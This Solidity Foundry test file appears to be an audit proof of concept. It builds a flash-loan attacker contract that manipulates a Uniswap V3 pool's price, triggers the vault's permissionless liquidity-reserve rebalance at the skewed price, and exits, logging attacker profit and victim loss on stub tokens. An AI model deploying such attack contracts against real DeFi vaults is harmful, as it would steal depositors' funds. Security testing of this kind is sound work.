// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IUniswapV3Pool} from "@crane/contracts/protocols/dexes/uniswap/v3/interfaces/IUniswapV3Pool.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v3/libraries/TickMath.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IStandardExchangeInMulti} from "contracts/interfaces/IStandardExchangeInMulti.sol";
import {IStandardExchangeOutMulti} from "contracts/interfaces/IStandardExchangeOutMulti.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IVaultFeeOracleManager} from "contracts/interfaces/IVaultFeeOracleManager.sol";
import {TestBase_UniswapV3FullSpreadStandardExchangeVault} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v3/test/bases/TestBase_UniswapV3FullSpreadStandardExchangeVault.sol";
import {IUniswapV3FullSpreadStandardExchangeVaultLiquidReserve as ILR} from
    "contracts/vaults/standard/exchange/protocols/uniswap/v3/interfaces/IUniswapV3FullSpreadStandardExchangeVaultLiquidReserve.sol";

/// @notice Independent flash lender (not protocol). 9 bps fee; reverts unless repaid in the same call.
contract AdjMjFlashLender {
    uint256 public constant FEE_BPS = 9;

    function flash(address[2] calldata tokens, uint256[2] calldata amounts, bytes calldata data) external {
        uint256[2] memory before;
        for (uint256 i; i < 2; ++i) {
            before[i] = IERC20(tokens[i]).balanceOf(address(this));
            IERC20(tokens[i]).transfer(msg.sender, amounts[i]);
        }
        AdjMjAttacker(msg.sender).onFlash(amounts);
        for (uint256 i; i < 2; ++i) {
            require(
                IERC20(tokens[i]).balanceOf(address(this)) >= before[i] + amounts[i] * FEE_BPS / 10_000, "flash unpaid"
            );
        }
    }
}

/// @notice Unprivileged attacker. Uses only public pool + vault entrypoints.
contract AdjMjAttacker {
    IUniswapV3Pool public immutable pool;
    IStandardExchangeProxy public immutable vault;
    AdjMjFlashLender public immutable lender;
    IERC20 public immutable t0;
    IERC20 public immutable t1;

    uint160 public sqrtStart;
    uint160 public sqrtTarget;
    uint256 public depositEach;
    bool public doRebalance;
    uint8 internal phase; // 1 = blocked deposit (tiny swap), 2 = push, 3 = restore

    uint128 public vaultLBeforeRebal;
    uint128 public vaultLAfterRebal;
    uint256 public sharesGot;
    uint256 public exitShares;
    uint256 public preDust;
    uint256 public postDust;
    uint256 public exitOut0;
    uint256 public exitOut1;

    function _ceilDiv(uint256 a, uint256 b) internal pure returns (uint256) {
        return a == 0 ? 0 : (a - 1) / b + 1;
    }

    constructor(IUniswapV3Pool pool_, IStandardExchangeProxy vault_, AdjMjFlashLender lender_) {
        pool = pool_;
        vault = vault_;
        lender = lender_;
        t0 = IERC20(pool_.token0());
        t1 = IERC20(pool_.token1());
    }

    function attack(uint160 sqrtTarget_, uint256 depositEach_, bool doRebalance_, uint256 borrow0, uint256 borrow1)
        external
    {
        sqrtTarget = sqrtTarget_;
        depositEach = depositEach_;
        doRebalance = doRebalance_;
        (sqrtStart,,,,,,) = pool.slot0();
        t0.approve(address(vault), type(uint256).max);
        t1.approve(address(vault), type(uint256).max);
        IERC20(address(vault)).approve(address(vault), type(uint256).max);
        lender.flash([address(t0), address(t1)], [borrow0, borrow1], "");
    }

    function _vaultL() internal view returns (uint128 L) {
        (L,,,,) = pool.positions(keccak256(abi.encodePacked(address(vault), TickMath.minUsableTick(60), TickMath.maxUsableTick(60))));
    }

    function onFlash(uint256[2] calldata amounts) external {
        require(msg.sender == address(lender), "lender");
        // 0) optional: fair proportional dual deposit at P0 while the pool is locked (inside a 1-wei swap callback).
        //    Blocked mode skips the best-effort rebalance, so the deposit stays as two-sided idle excess.
        if (depositEach > 0) {
            phase = 1;
            pool.swap(address(this), false, int256(1), TickMath.MAX_SQRT_RATIO - 1, "");
            sharesGot = IERC20(address(vault)).balanceOf(address(this));
        }
        // 1) push price of token0 up (token1 in) to sqrtTarget
        if (sqrtTarget > sqrtStart) {
            phase = 2;
            pool.swap(address(this), false, int256(t1.balanceOf(address(this))), sqrtTarget, "");
        }
        // 2) permissionless maintenance at the manipulated spot
        vaultLBeforeRebal = _vaultL();
        if (doRebalance) ILR(address(vault)).rebalanceLiquidReserve();
        vaultLAfterRebal = _vaultL();
        // 3) restore price to start (token0 in)
        (uint160 sp,,,,,,) = pool.slot0();
        if (sp > sqrtStart) {
            phase = 3;
            pool.swap(address(this), true, int256(t0.balanceOf(address(this))), sqrtStart, "");
        }
        // 4) exit the vault at P0. First a dust non-blocked dual deposit at P0 collects fees into free (fair op),
        //    then a dual exact-out exit with amounts that are exactly pro-rata (vault requires equal share burns).
        uint256 sh = IERC20(address(vault)).balanceOf(address(this));
        if (sh > 0) {
            address[] memory toks = new address[](2);
            toks[0] = address(t0);
            toks[1] = address(t1);
            uint256[] memory outs = new uint256[](2);
            outs[0] = 1e12;
            outs[1] = 1e12;
            {
                (uint256 a0, uint256 a1) = ILR(address(vault)).deployedReserve();
                preDust = t0.balanceOf(address(vault)) + a0 + t1.balanceOf(address(vault)) + a1;
            }
            IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(
                toks, outs, IERC20(address(vault)), 0, address(this), false, block.timestamp
            );
            sh = IERC20(address(vault)).balanceOf(address(this));
            {
                (uint256 a0, uint256 a1) = ILR(address(vault)).deployedReserve();
                postDust = t0.balanceOf(address(vault)) + a0 + t1.balanceOf(address(vault)) + a1;
            }
            uint256 S = IERC20(address(vault)).totalSupply();
            (uint256 d0, uint256 d1) = ILR(address(vault)).deployedReserve();
            uint256 T0 = t0.balanceOf(address(vault)) + d0;
            uint256 T1 = t1.balanceOf(address(vault)) + d1;
            uint256 s = sh;
            for (uint256 i; i < 2000; ++i) {
                outs[0] = s * T0 / S;
                outs[1] = s * T1 / S;
                if (_ceilDiv(outs[0] * S, T0) == s && _ceilDiv(outs[1] * S, T1) == s) break;
                --s;
            }
            exitShares = s;
            exitOut0 = outs[0];
            exitOut1 = outs[1];
            IStandardExchangeOutMulti(address(vault)).exchangeOutOneToMany(
                IERC20(address(vault)), s, toks, outs, address(this), false, block.timestamp
            );
        }
        // 5) repay
        t0.transfer(address(lender), amounts[0] + amounts[0] * lender.FEE_BPS() / 10_000);
        t1.transfer(address(lender), amounts[1] + amounts[1] * lender.FEE_BPS() / 10_000);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == address(pool), "pool");
        if (phase == 1) {
            require(!ILR(address(vault)).canOpenBoundPoolOps(), "expected blocked");
            address[] memory toks = new address[](2);
            toks[0] = address(t0);
            toks[1] = address(t1);
            // book-proportional two-sided deposit (fair at P0): split 2*depositEach by the vault's book ratio
            uint256[] memory amts = new uint256[](2);
            (uint256 a0, uint256 a1) = ILR(address(vault)).deployedReserve();
            uint256 T0 = t0.balanceOf(address(vault)) + a0;
            uint256 T1 = t1.balanceOf(address(vault)) + a1;
            amts[0] = 2 * depositEach * T0 / (T0 + T1);
            amts[1] = 2 * depositEach * T1 / (T0 + T1);
            IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(
                toks, amts, IERC20(address(vault)), 0, address(this), false, block.timestamp
            );
        }
        if (amount0Delta > 0) t0.transfer(msg.sender, uint256(amount0Delta));
        if (amount1Delta > 0) t1.transfer(msg.sender, uint256(amount1Delta));
    }
}

contract AdjMaintJitProdTest is TestBase_UniswapV3FullSpreadStandardExchangeVault {
    IUniswapV3Pool internal pool;
    IStandardExchangeProxy internal vault;
    IERC20 internal token0;
    IERC20 internal token1;
    address internal victim;
    AdjMjFlashLender internal lender;
    AdjMjAttacker internal att;
    uint160 internal sp0;

    uint256 constant VICTIM_DEPOSIT = 1_000 ether;
    uint256 constant OWN_CAPITAL = 100 ether; // per token, counted as cost at P0 = 1

    function _setUpMarket(uint128 externalLiquidity) internal {
        ERC20PermitMintableStub a = new ERC20PermitMintableStub("Asset A", "A", 18, address(this), 0);
        ERC20PermitMintableStub b = new ERC20PermitMintableStub("Asset B", "B", 18, address(this), 0);
        pool = _createPoolOneToOne(address(a), address(b), FEE_MEDIUM);
        _seedExternalLiquidity(pool, externalLiquidity);
        vault = _deployVault(pool);
        token0 = IERC20(pool.token0());
        token1 = IERC20(pool.token1());

        victim = makeAddr("victim");
        a.mint(victim, VICTIM_DEPOSIT);
        b.mint(victim, VICTIM_DEPOSIT);
        vm.startPrank(victim);
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        address[] memory tokens = new address[](2);
        tokens[0] = address(token0);
        tokens[1] = address(token1);
        uint256[] memory amounts = new uint256[](2);
        amounts[0] = VICTIM_DEPOSIT;
        amounts[1] = VICTIM_DEPOSIT;
        IStandardExchangeInMulti(address(vault)).exchangeInManyToOne(
            tokens, amounts, IERC20(address(vault)), 0, victim, false, block.timestamp
        );
        vm.stopPrank();
        // sleeve at target (permissionless, honest keeper)
        ILR(address(vault)).rebalanceLiquidReserve();

        lender = new AdjMjFlashLender();
        a.mint(address(lender), 1e30);
        b.mint(address(lender), 1e30);
        (sp0,,,,,,) = pool.slot0();
    }

    function _nav() internal view returns (uint256 nav) {
        (uint160 sp,,,,,,) = pool.slot0();
        require(sp == sp0, "not at P0");
        (uint256 d0, uint256 d1) = ILR(address(vault)).deployedReserve();
        nav = token0.balanceOf(address(vault)) + d0 + token1.balanceOf(address(vault)) + d1; // P0 = 1
    }

    function _victimValue() internal view returns (uint256) {
        return _nav() * IERC20(address(vault)).balanceOf(victim) / IERC20(address(vault)).totalSupply();
    }

    function _logState(string memory tag) internal view {
        (uint256 d0, uint256 d1) = ILR(address(vault)).deployedReserve();
        console2.log(tag);
        console2.log("  vault free0/free1 (e15):", token0.balanceOf(address(vault)) / 1e15, token1.balanceOf(address(vault)) / 1e15);
        console2.log("  vault deployed0/deployed1 (e15):", d0 / 1e15, d1 / 1e15);
        console2.log("  pool L (e15):", uint256(pool.liquidity()) / 1e15);
    }

    function _run(uint128 extL, uint256 sqrtMulBps, uint256 depositEach, bool doRebalance)
        internal
        returns (int256 profit, int256 victimLoss)
    {
        _setUpMarket(extL);
        _logState("---- pre-attack");
        uint256 victimBefore = _victimValue();
        uint256 navBefore = _nav();

        att = new AdjMjAttacker(pool, vault, lender);
        ERC20PermitMintableStub(address(token0)).mint(address(att), OWN_CAPITAL);
        ERC20PermitMintableStub(address(token1)).mint(address(att), OWN_CAPITAL);
        uint256 poolL = uint256(pool.liquidity());
        uint256 push = poolL * (sqrtMulBps - 10_000) / 10_000 * 103 / 100;
        uint256 b0 = depositEach + push * 2; // restore leg also crosses JIT-added liquidity
        uint256 b1 = depositEach + push;
        att.attack(uint160(uint256(sp0) * sqrtMulBps / 10_000), depositEach, doRebalance, b0, b1);

        (uint160 spEnd,,,,,,) = pool.slot0();
        assertEq(uint256(spEnd), uint256(sp0), "pool restored to P0");
        _logState("---- post-attack");
        console2.log("sqrt push bps:", sqrtMulBps, " depositEach (e18):", depositEach / 1e18);
        console2.log("vault L before / after rebalance (e15):", uint256(att.vaultLBeforeRebal()) / 1e15, uint256(att.vaultLAfterRebal()) / 1e15);
        console2.log("attacker shares minted / left:", att.sharesGot(), IERC20(address(vault)).balanceOf(address(att)));
        uint256 e0 = token0.balanceOf(address(att));
        uint256 e1 = token1.balanceOf(address(att));
        console2.log("attacker exit shares / out0 / out1 (e15):", att.exitShares() / 1e15, att.exitOut0() / 1e15);
        console2.log("  exit out1 (e15):", att.exitOut1() / 1e15);
        console2.log("vault book (free+deployed) before/after dust deposit (wei):", att.preDust(), att.postDust());
        console2.log("attacker end token0 / token1 (e15):", e0 / 1e15, e1 / 1e15);
        // leftover shares (exit rounding) valued at NAV at P0
        uint256 leftShares = IERC20(address(vault)).balanceOf(address(att));
        uint256 leftVal = leftShares == 0 ? 0 : _nav() * leftShares / IERC20(address(vault)).totalSupply();
        profit = int256(e0 + e1 + leftVal) - int256(2 * OWN_CAPITAL);
        uint256 victimAfter = _victimValue();
        victimLoss = int256(victimBefore) - int256(victimAfter);
        console2.log("vault NAV at P0 before / after (e15):", navBefore / 1e15, _nav() / 1e15);
        console2.log("victim value at P0 before / after (wei):", victimBefore, victimAfter);
        console2.log("ATTACKER NET PnL (token1-equiv wei, P0):", profit);
        console2.log("VICTIM LOSS (wei, P0):", victimLoss);
    }


    function runExt(uint128 e, uint256 p, uint256 d) external returns (int256 a, int256 v) { return _run(e, p, d, true); }
    function _try(uint128 e, uint256 p, uint256 d) internal {
        try this.runExt(e, p, d) returns (int256 a, int256 v) {
            console2.log("RESULT extL/push/deposit", uint256(e) / 1e18, p, d / 1e18);
            console2.log("  ATTACKER PnL"); console2.logInt(a);
            console2.log("  VICTIM LOSS"); console2.logInt(v);
        } catch (bytes memory err) {
            console2.log("RESULT REVERTED extL/push/deposit", uint256(e) / 1e18, p, d / 1e18);
            console2.logBytes(err);
        }
    }
    /// production-like depth: vault ~2% of in-range L
    function test_prodDepth_2pct() public virtual {
        _try(39_200e18, 14_142, 1_000 ether);
        _try(39_200e18, 11_000, 1_000 ether);
        _try(39_200e18, 14_142, 4_000 ether);
    }
}

contract AdjMaintJitZeroSleeveTest is AdjMaintJitProdTest {
    function setUp() public virtual override {
        super.setUp();
        vm.prank(owner);
        IVaultFeeOracleManager(address(indexedexManager)).setDefaultLiquidReservePercentageOfTypeId(type(ILR).interfaceId, 0);
    }
    function test_prodDepth_2pct() public override {}
    function test_zeroSleeve_lambda2_and_2pct() public {
        _try(800e18, 14_142, 1_000 ether);
        _try(39_200e18, 14_142, 1_000 ether);
    }
}
